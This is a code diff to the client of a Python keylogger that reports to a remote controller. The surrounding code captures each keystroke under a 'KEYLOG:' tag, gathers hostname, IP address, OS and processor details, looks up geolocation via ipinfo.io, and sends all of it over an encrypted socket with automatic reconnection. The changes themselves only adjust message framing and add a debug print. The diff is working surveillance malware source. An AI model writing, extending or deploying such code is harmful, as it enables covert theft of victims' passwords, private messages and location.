@@ -117,9 +117,10 @@ def send_data_to_gui(data):
                     print("[!] Failed to reconnect, data not sent")
                     return False
 
-            # Send data
-            secure_socket.sendall(data.encode())
-            print(f"[+] Sent (encrypted): {data[:50]}...")  # Show first 50 chars
+            # Send data with newline terminator
+            message = data + "\n"  # Ensure single newline at end
+            secure_socket.sendall(message.encode())
+            print(f"[+] Sent (encrypted): {data[:50]}...")
             return True
 
         except (ConnectionResetError, BrokenPipeError, OSError) as e:
@@ -129,7 +130,8 @@ def send_data_to_gui(data):
             if connect_to_server():
                 # Retry sending
                 try:
-                    secure_socket.sendall(data.encode())
+                    message = data + "\n"
+                    secure_socket.sendall(message.encode())
                     print(f"[+] Sent (encrypted): {data[:50]}...")
                     return True
                 except Exception as e2:
@@ -160,7 +162,9 @@ def format_key(key):
 def send_current_char(char):
     if char.strip():  # Only send if it's not empty
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-        send_data_to_gui(f"KEYLOG: [{timestamp}] {char.strip()}")
+        message = f"KEYLOG: [{timestamp}] {char.strip()}"
+        print(f"[CLIENT DEBUG] Sending: {message}")  # Add this line
+        send_data_to_gui(message)
 
 
 # Function to send computer info and geo-location to GUI
@@ -198,13 +202,14 @@ def get_computer_info():
         machine = platform.machine()
         processor = platform.processor()
 
+        # Use " | " separator instead of newlines
         computer_info = (
-            f"Hostname: {hostname}\n"
-            f"IP Address: {ip_address}\n"
-            f"Operating System: {system} {release}\n"
-            f"OS Version: {version}\n"
-            f"Machine: {machine}\n"
-            f"Processor: {processor}\n"
+            f"Hostname: {hostname} | "
+            f"IP Address: {ip_address} | "
+            f"Operating System: {system} {release} | "
+            f"OS Version: {version} | "
+            f"Machine: {machine} | "
+            f"Processor: {processor}"
         )
         return computer_info
     except Exception as e:
@@ -217,13 +222,14 @@ def get_geo_location():
         response = requests.get("https://ipinfo.io/json", timeout=5)
         if response.status_code == 200:
             data = response.json()
+            # Use " | " separator instead of newlines
             location = (
-                f"IP Address: {data.get('ip', 'N/A')}\n"
-                f"City: {data.get('city', 'N/A')}\n"
-                f"Region: {data.get('region', 'N/A')}\n"
-                f"Country: {data.get('country', 'N/A')}\n"
-                f"Location (Lat, Long): {data.get('loc', 'N/A')}\n"
-                f"Organization: {data.get('org', 'N/A')}\n"
+                f"IP Address: {data.get('ip', 'N/A')} | "
+                f"City: {data.get('city', 'N/A')} | "
+                f"Region: {data.get('region', 'N/A')} | "
+                f"Country: {data.get('country', 'N/A')} | "
+                f"Location (Lat, Long): {data.get('loc', 'N/A')} | "
+                f"Organization: {data.get('org', 'N/A')}"
             )
             return location
         else:
